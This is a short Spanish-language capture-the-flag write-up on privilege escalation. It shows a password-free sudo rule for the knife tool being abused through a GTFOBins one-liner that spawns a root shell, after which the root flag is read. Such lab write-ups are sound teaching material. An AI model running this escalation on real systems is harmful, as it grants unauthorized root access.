## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
id
sudo -l
```

Podemos ejecutar el commando `/usr/bin/knife` como el usuario root sin proporcionar contraseña.

buscando por [gtfobins](https://gtfobins.github.io/gtfobins/knife/#sudo), vemos que podemos usar este
commando para ejecutar una shell.

```bash
sudo knife exec -E 'exec "/bin/bash"'
whoami
#Output 
root
```

Ya podemos leer la flag root.txt
